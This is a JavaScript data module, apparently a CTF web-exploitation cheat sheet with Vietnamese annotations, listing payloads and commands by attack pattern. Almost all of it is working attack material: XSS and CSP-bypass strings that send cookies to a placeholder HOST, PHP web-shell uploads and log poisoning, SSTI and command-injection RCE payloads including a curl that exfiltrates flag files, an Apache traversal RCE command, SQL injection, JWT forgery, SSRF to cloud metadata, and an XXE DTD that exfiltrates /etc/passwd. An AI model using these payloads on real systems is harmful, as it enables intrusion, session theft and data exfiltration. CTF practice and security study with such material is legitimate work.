const C = (...lines) => lines.join("\n");

// Payload bo sung cho cac pattern Web da co.
// Chi dung placeholder: TARGET, HOST, ALLOWED_HOST, OFFSET, INDEX...
export const webPayloads = {
  "pattern-multiflag-recon": [
    {
      title: "Vị trí flag thường gặp",
      code: C(
        "/flag.php",
        "/flag.txt",
        "/robots.txt",
        "/sitemap.xml",
        "/.well-known/security.txt",
        "/assets/app.js.map",
        "/.git/config"
      )
    },
    {
      title: "Decode nhanh",
      code: C(
        "echo 'BASE64' | base64 -d",
        "echo 'HEX' | xxd -r -p",
        "python3 -c \"import urllib.parse;print(urllib.parse.unquote('URL_ENCODED'))\""
      )
    }
  ],

  "pattern-csp-bypass": [
    {
      title: "JSONP host allowlist",
      code: "<script src=\"https://ALLOWED_HOST/jsonp?callback=alert(document.domain)//\"></script>"
    },
    {
      title: "AngularJS constructor",
      code: C(
        "<div ng-app ng-csp>{{constructor.constructor('fetch(\"//HOST/?c=\"+document.cookie)')()}}</div>",
        "<div ng-app>{{$eval.constructor('alert(document.domain)')()}}</div>"
      )
    },
    {
      title: "CSP header injection",
      code: C(
        "x;script-src-elem 'unsafe-inline';",
        "x;report-uri https://HOST/csp;"
      )
    }
  ],

  "pattern-xss-waf-bot": [
    {
      title: "Tag/event cơ bản",
      code: C(
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<details open ontoggle=alert(1)>"
      )
    },
    {
      title: "Breakout context",
      code: C(
        "\"><img src=x onerror=alert(1)>",
        "'><svg onload=alert(1)>",
        "';alert(1)//"
      )
    },
    {
      title: "Exfil cookie/token",
      code: C(
        "<script>new Image().src='//HOST/?c='+encodeURIComponent(document.cookie)</script>",
        "<script>fetch('/profile').then(r=>r.text()).then(t=>fetch('//HOST/?d='+encodeURIComponent(t)))</script>"
      )
    },
    {
      title: "Entity / double URL",
      code: C(
        "&#60;img src=x onerror=alert(1)&#62;",
        "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E"
      )
    }
  ],

  "pattern-phar-chain": [
    {
      title: "Traversal + wrappers",
      code: C(
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=index.php",
        "data://text/plain,<?php system($_GET['c']); ?>",
        "/proc/self/environ"
      )
    },
    {
      title: "Log poisoning",
      code: C(
        "User-Agent: <?php system($_GET['c']); ?>",
        "?page=/var/log/apache2/access.log",
        "?page=/var/log/nginx/access.log"
      )
    },
    {
      title: "Upload extension",
      code: C(
        "shell.php.jpg",
        "shell.jpg.php",
        "shell.phtml",
        "shell.php5",
        "shell.phar",
        ".htaccess"
      )
    },
    {
      title: ".htaccess",
      code: "AddType application/x-httpd-php .jpg"
    },
    {
      title: "Phar / zip wrapper",
      code: C(
        "?page=phar:///var/www/html/uploads/shell.jpg/shell.php",
        "?page=zip://uploads/shell.jpg%23shell.php"
      )
    },
    {
      title: "disable_functions hay dùng",
      code: C(
        "FFI",
        "LD_PRELOAD",
        "imap_open",
        "error_log",
        "mail",
        "putenv",
        "pcntl_exec"
      )
    }
  ],

  "pattern-jwt-auth": [
    {
      title: "Decode token",
      code: "echo 'TOKEN' | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq"
    },
    {
      title: "kid traversal",
      code: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../../dev/null\"}"
    },
    {
      title: "jku / x5u",
      code: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://HOST/jwks.json\"}"
    },
    {
      title: "RS256 -> HS256",
      code: C(
        "{\"alg\":\"HS256\",\"typ\":\"JWT\"}",
        "jwt_tool TOKEN -X k -pk public.pem"
      )
    },
    {
      title: "JWKS leak",
      code: C(
        "curl -s http://TARGET/.well-known/jwks.json | jq",
        "# private key chỉ lộ nếu có trường \"d\""
      )
    },
    {
      title: "Mass assignment variants",
      code: C(
        "{\"username\":\"u\",\"password\":\"p\",\"role\":\"admin\"}",
        "{\"email\":\"u@x\",\"is_admin\":true}",
        "{\"user\":{\"role\":\"admin\",\"balance\":999999}}"
      )
    },
    {
      title: "Header bypass",
      code: C(
        "X-Forwarded-For: 127.0.0.1",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "X-Middleware-Subrequest: middleware:middleware:middleware"
      )
    }
  ],

  "pattern-php-cookie": [
    {
      title: "Generate serialize",
      code: "php -r 'echo serialize([\"role\"=>\"admin\",\"is_admin\"=>true]);'"
    },
    {
      title: "Length helper",
      code: C(
        "python3 - <<'PY'",
        "s = \"Golden Sword\"",
        "print(f's:{len(s)}:\"{s}\";')",
        "PY"
      )
    },
    {
      title: "Base64 cookie",
      code: "echo -n 'O:4:\"User\":2:{s:4:\"role\";s:5:\"admin\";s:4:\"file\";s:9:\"/flag.txt\";}' | base64 -w0"
    },
    {
      title: "Magic hash",
      code: C(
        "240610708",
        "QNKCDZO"
      )
    },
    {
      title: "stdClass injection",
      code: "O:8:\"stdClass\":1:{s:5:\"admin\";b:1;}"
    }
  ],

  "pattern-sqli-context": [
    {
      title: "Auth bypass variants",
      code: C(
        "' OR 1=1-- -",
        "' OR '1'='1",
        "admin'-- -",
        "\" OR 1=1-- -",
        "' OR 1=1 LIMIT 1#"
      )
    },
    {
      title: "Union",
      code: C(
        "' UNION SELECT 1,2,3-- -",
        "' UNION SELECT username,password FROM users-- -"
      )
    },
    {
      title: "DB fingerprint",
      code: C(
        "' AND @@version LIKE '8%'-- -",
        "' AND sqlite_version() LIKE '3%'-- -",
        "' AND version() LIKE 'PostgreSQL%'-- -"
      )
    },
    {
      title: "Blind boolean",
      code: C(
        "' AND SUBSTR((SELECT flag FROM flag),1,1)='B'-- -",
        "' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0-- -",
        "' AND (SELECT SUBSTR(secret,1,1) FROM users LIMIT 1)='a'-- -"
      )
    },
    {
      title: "Time blind",
      code: C(
        "' AND SLEEP(5)-- -",
        "' AND CASE WHEN 1=1 THEN randomblob(100000000) ELSE 1 END-- -"
      )
    },
    {
      title: "WAF bypass",
      code: C(
        "UNION/**/SELECT",
        "/*!50000UNION*/ SELECT",
        "%27%20OR%201=1--%20"
      )
    }
  ],

  "pattern-ssti": [
    {
      title: "Detect engine",
      code: C(
        "${{<%[%'\"}}%\\.",
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>"
      )
    },
    {
      title: "Jinja2 RCE variants",
      code: C(
        "{{ config }}",
        "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
        "{{ lipsum.__globals__['os'].popen('id').read() }}",
        "{{ cycler.__init__.__globals__.os.popen('id').read() }}"
      )
    },
    {
      title: "Jinja2 subclasses",
      code: C(
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}"
      )
    },
    {
      title: "Twig",
      code: C(
        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
        "{{['id']|map('system')|join}}"
      )
    },
    {
      title: "Freemarker / ERB",
      code: C(
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "<%= system('id') %>"
      )
    }
  ],

  "pattern-logic-type": [
    {
      title: "Number edge cases",
      code: C(
        "amount=1000a",
        "amount=0e123456",
        "amount=0.9999999901",
        "amount=-1000",
        "amount=NaN",
        "amount=1e309"
      )
    },
    {
      title: "HTTP parameter pollution",
      code: C(
        "amount=1&amount=1000",
        "role=user&role=admin",
        "id=1&id=2"
      )
    },
    {
      title: "Mass assignment",
      code: C(
        "{\"coins\":999999,\"role\":\"admin\"}",
        "{\"amount\":0.9999999901}",
        "{\"quantity\":-1000}"
      )
    },
    {
      title: "Prototype pollution",
      code: C(
        "__proto__[isAdmin]=true",
        "constructor[prototype][isAdmin]=true",
        "{\"__proto__\":{\"isAdmin\":true}}"
      )
    }
  ],

  "pattern-devserver-cve": [
    {
      title: "Vite paths",
      code: C(
        "GET /@fs//etc/passwd?raw",
        "GET /@fs//app/.env?raw",
        "GET /node_modules/.vite/deps/package.json",
        "GET /.vite/manifest.json",
        "GET /src/main.js?raw"
      )
    },
    {
      title: "Next header bypass",
      code: C(
        "X-Middleware-Subrequest: middleware:middleware:middleware:middleware",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin"
      )
    },
    {
      title: "Apache CVE variants",
      code: C(
        "curl --path-as-is 'http://TARGET/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; id'",
        "curl --path-as-is 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; id'"
      )
    },
    {
      title: "Source map / debug",
      code: C(
        "curl -s http://TARGET/static/js/main.js | tail -3",
        "curl -s http://TARGET/static/js/main.js.map | head",
        "/.git/config",
        "/.env",
        "/server-status",
        "/actuator/env",
        "/debug/pprof/"
      )
    },
    {
      title: "Framework debug / backup",
      code: C(
        "/console",
        "/actuator/heapdump",
        "/manager/html",
        "/static../etc/passwd",
        "/swagger.json",
        "/openapi.json",
        "/.DS_Store",
        "/backup.zip",
        "/www.zip"
      )
    }
  ]
};

export const webCommands = {
  "pattern-multiflag-recon": [
    {
      title: "Asset + source map",
      code: C(
        "curl -s http://TARGET/ | grep -oE '(src|href)=\"[^\"]+\"'",
        "curl -s http://TARGET/assets/app.js | grep -iE 'flag|secret|sourceMappingURL|api/'",
        "curl -s http://TARGET/assets/app.js.map | head -40"
      )
    }
  ],
  "pattern-csp-bypass": [
    {
      title: "Đọc CSP",
      code: "curl -sI http://TARGET/ | grep -i '^content-security-policy'"
    }
  ],
  "pattern-xss-waf-bot": [
    {
      title: "Listener + tunnel",
      code: C(
        "python3 -m http.server 8000",
        "cloudflared tunnel --url http://localhost:8000"
      )
    }
  ],
  "pattern-phar-chain": [
    {
      title: "Filter chain + upload",
      code: C(
        "python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'",
        "curl -F 'file=@shell.jpg;type=image/jpeg' http://TARGET/upload"
      )
    }
  ],
  "pattern-jwt-auth": [
    {
      title: "Weak secret / jwt_tool",
      code: C(
        "hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt",
        "jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt",
        "jwt_tool TOKEN -T"
      )
    },
    {
      title: "kid / jku",
      code: C(
        "jwt_tool TOKEN -I -hc kid -hv ../../../../dev/null -S hs256 -p ''",
        "jwt_tool TOKEN -X s -ju https://HOST/jwks.json"
      )
    }
  ],
  "pattern-php-cookie": [
    {
      title: "Base64 encode/decode",
      code: C(
        "echo -n 'SERIALIZED' | base64 -w0",
        "echo 'BASE64' | base64 -d"
      )
    }
  ],
  "pattern-sqli-context": [
    {
      title: "sqlmap",
      code: C(
        "sqlmap -u 'http://TARGET/item?id=1' --batch --dbs",
        "sqlmap -u 'http://TARGET/sort?key=1' --batch --dbms=sqlite --technique=BEUT",
        "sqlmap -u 'http://TARGET/item?id=1' --batch --tamper=space2comment"
      )
    }
  ]
};

const webExtra = [
  {
    id: "pattern-command-injection",
    group: "Web patterns",
    title: "OS command injection",
    category: "Web",
    summary: "Param chạy lệnh (ping, convert, backup): thử separator, substitution, newline; blind thì dùng OAST/time.",
    tags: ["command-injection", "rce", "ping", "blind", "oast"],
    priority: "high",
    steps: [
      "Xác định param nào được đưa vào shell (ping, convert, curl, backup).",
      "Thử separator: `;`, `|`, `||`, `&&`, newline.",
      "Thử substitution: `$(id)`, backtick, `${IFS}` khi space bị lọc.",
      "Nếu output không thấy: blind bằng sleep hoặc gọi DNS/HTTP ra HOST.",
      "Đọc source/flag bằng `cat /flag*`, `env`, `ls -la`."
    ],
    payloads: [
      {
        title: "Separator cơ bản",
        code: C(
          "; id",
          "| id",
          "|| id",
          "&& id",
          "%0a id",
          "127.0.0.1; id",
          "127.0.0.1|id"
        )
      },
      {
        title: "Substitution",
        code: C(
          "$(id)",
          "`id`",
          "$(cat /flag*)",
          "`cat /flag*`"
        )
      },
      {
        title: "Bypass space",
        code: C(
          "cat${IFS}/flag",
          "cat$IFS/flag",
          "cat</flag",
          "cat${IFS}</flag"
        )
      },
      {
        title: "Blind OAST",
        code: C(
          "; curl http://HOST/?c=$(cat /flag* | base64 -w0)",
          "| curl http://HOST/?c=$(id)",
          "; sleep 5"
        )
      }
    ],
    commands: [
      {
        title: "commix / OAST",
        code: C(
          "commix --url='http://TARGET/?cmd=INJECT' --batch",
          "interactsh-client",
          "python3 -m http.server 8000"
        )
      }
    ],
    gotchas: [
      "Param có thể bị quote; thử thoát quote trước.",
      "Space bị lọc: dùng `${IFS}`, tab, hoặc `<`.",
      "Không thấy output: blind qua DNS/HTTP hoặc sleep.",
      "Windows: `&`, `|`, `%0a`; lệnh `whoami`, `type C:\\flag.txt`."
    ],
    links: [
      { title: "HackTricks command injection", url: "https://book.hacktricks.wiki/en/pentesting-web/command-injection.html" }
    ]
  },
  {
    id: "pattern-ssrf",
    group: "Web patterns",
    title: "SSRF",
    category: "Web",
    summary: "Server fetch URL: thử localhost/metadata, scheme file/gopher, redirect và bypass allowlist.",
    tags: ["ssrf", "metadata", "gopher", "url-fetch", "dns-rebinding"],
    priority: "high",
    steps: [
      "Tìm param nhận URL (avatar, webhook, import, preview).",
      "Thử `127.0.0.1`, `localhost`, `[::1]`, `127.1`, decimal/hex.",
      "Thử metadata cloud và port nội bộ.",
      "Thử `file://`, `gopher://`, `dict://` nếu server hỗ trợ.",
      "Nếu allowlist: dùng `@`, redirect 302, DNS rebinding, `nip.io`."
    ],
    payloads: [
      {
        title: "Localhost variants",
        code: C(
          "http://127.0.0.1/",
          "http://localhost/",
          "http://[::1]/",
          "http://127.1/",
          "http://2130706433/",
          "http://0x7f000001/"
        )
      },
      {
        title: "Cloud metadata",
        code: C(
          "http://169.254.169.254/latest/meta-data/",
          "http://metadata.google.internal/computeMetadata/v1/",
          "http://100.100.100.200/latest/meta-data/"
        )
      },
      {
        title: "Scheme khác",
        code: C(
          "file:///etc/passwd",
          "gopher://127.0.0.1:6379/_INFO",
          "dict://127.0.0.1:6379/INFO"
        )
      },
      {
        title: "Allowlist bypass",
        code: C(
          "http://127.0.0.1.nip.io/",
          "http://attacker@127.0.0.1/",
          "http://allowed-host@127.0.0.1/",
          "http://allowed-host.attacker.com/"
        )
      }
    ],
    commands: [
      {
        title: "OAST / ssrfmap",
        code: C(
          "interactsh-client",
          "ssrfmap -r request.txt -p url --level 5",
          "curl -s --max-time 5 'http://TARGET/fetch?url=http://127.0.0.1:80/'"
        )
      }
    ],
    gotchas: [
      "Allowlist có thể check hostname trước khi resolve; thử redirect/DNS rebinding.",
      "Metadata cần header đặc biệt (Google: `Metadata-Flavor: Google`).",
      "Port nội bộ hay gặp: 80, 6379, 8080, 9000, 5000.",
      "Không phải SSRF nếu server chỉ trả ảnh đã cache."
    ],
    links: [
      { title: "HackTricks SSRF", url: "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html" }
    ]
  },
  {
    id: "pattern-xxe",
    group: "Web patterns",
    title: "XXE",
    category: "Web",
    summary: "XML parser bật external entity: đọc file qua SYSTEM, blind qua OAST, SVG/SOAP cũng là XML.",
    tags: ["xxe", "xml", "svg", "soap", "oob"],
    priority: "medium",
    steps: [
      "Tìm endpoint nhận XML/SVG/SOAP hoặc upload file XML.",
      "Thử entity đọc file; xem response có nội dung không.",
      "Nếu blind: dùng external DTD trỏ về HOST.",
      "Thử SVG/SOAP wrapper nếu endpoint chỉ nhận file.",
      "Đọc source/flag hoặc SSRF nội bộ qua `SYSTEM`."
    ],
    payloads: [
      {
        title: "Đọc file cơ bản",
        code: C(
          "<?xml version=\"1.0\"?>",
          "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
          "<root>&xxe;</root>"
        )
      },
      {
        title: "PHP filter base64",
        code: C(
          "<?xml version=\"1.0\"?>",
          "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/html/index.php\">]>",
          "<root>&xxe;</root>"
        )
      },
      {
        title: "Blind OOB DTD",
        code: C(
          "<?xml version=\"1.0\"?>",
          "<!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://HOST/evil.dtd\"> %xxe;]>",
          "<root>&out;</root>"
        )
      },
      {
        title: "evil.dtd",
        code: C(
          "<!ENTITY % file SYSTEM \"file:///etc/passwd\">",
          "<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://HOST/?d=%file;'>\">",
          "%eval;",
          "%exfil;"
        )
      },
      {
        title: "SVG / SOAP",
        code: C(
          "<svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>",
          "<soap:Body><foo>&xxe;</foo></soap:Body>"
        )
      }
    ],
    commands: [
      {
        title: "POST XML",
        code: "curl -s -X POST -H 'Content-Type: application/xml' --data-binary @xxe.xml http://TARGET/api"
      }
    ],
    gotchas: [
      "Parser có thể tắt external entity; thử SVG/SOAP endpoint khác.",
      "Blind XXE cần DTD public và OAST.",
      "File có thể cần base64/UTF-16 để tránh lỗi encoding.",
      "XXE cũng đọc được file qua `php://filter`."
    ],
    links: [
      { title: "PortSwigger XXE", url: "https://portswigger.net/web-security/xxe" }
    ]
  },
  {
    id: "pattern-auth-idor",
    group: "Web patterns",
    title: "Auth / IDOR / header bypass",
    category: "Web",
    summary: "Đổi id/role, thử header tin cậy và path normalization; đọc source để tìm route ẩn.",
    tags: ["auth", "idor", "access-control", "header-bypass", "mass-assignment", "cors", "nosql"],
    priority: "high",
    steps: [
      "Dò id/username/UUID: đổi 1 -> 0 -> 2, so sánh response và status.",
      "Kiểm tra signup/update có nhận `role`, `is_admin`, `balance` trực tiếp.",
      "Thử header tin cậy: `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`.",
      "Thử path normalization: `%2e%2e`, `//admin`, `/admin/..`, `;/`.",
      "Đọc source/route ẩn; thử method override và CORS reflection."
    ],
    payloads: [
      {
        title: "IDOR",
        code: C(
          "GET /api/user/1",
          "GET /api/users/1/secret",
          "GET /api/profile?id=1",
          "GET /api/order/1",
          "GET /api/user/00000000-0000-0000-0000-000000000000"
        )
      },
      {
        title: "Mass assignment",
        code: C(
          "{\"role\":\"admin\"}",
          "{\"is_admin\":true}",
          "{\"user\":{\"role\":\"admin\",\"balance\":999999}}",
          "{\"verified\":true,\"email\":\"admin@local\"}"
        )
      },
      {
        title: "NoSQL auth bypass",
        code: C(
          "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
          "{\"username\":\"admin\",\"password\":{\"$regex\":\"^.*\"}}"
        )
      },
      {
        title: "Header bypass",
        code: C(
          "X-Forwarded-For: 127.0.0.1",
          "X-Original-URL: /admin",
          "X-Rewrite-URL: /admin",
          "X-Middleware-Subrequest: middleware:middleware",
          "X-HTTP-Method-Override: PUT"
        )
      },
      {
        title: "Path / CORS",
        code: C(
          "/admin",
          "//admin",
          "/%2e%2e/admin",
          "/admin/..",
          "/admin%2f..",
          "Origin: https://evil",
          "X-Forwarded-Host: evil"
        )
      }
    ],
    commands: [
      {
        title: "IDOR fuzz",
        code: C(
          "ffuf -u http://TARGET/api/user/FUZZ -w ids.txt -mc all -fs 0",
          "arjun -u http://TARGET/api/user -m GET,POST",
          "curl -s -H 'X-Forwarded-For: 127.0.0.1' http://TARGET/admin"
        )
      }
    ],
    gotchas: [
      "IDOR có thể dùng UUID, không chỉ số; đọc JS/source để lấy danh sách.",
      "Header chỉ có tác dụng nếu app tin proxy; thử cả `Forwarded`.",
      "Path normalization khác nhau giữa nginx/Apache/Go.",
      "Mass assignment có thể nằm trong nested object."
    ],
    links: [
      { title: "PortSwigger access control", url: "https://portswigger.net/web-security/access-control" }
    ]
  }
];

export default webExtra;
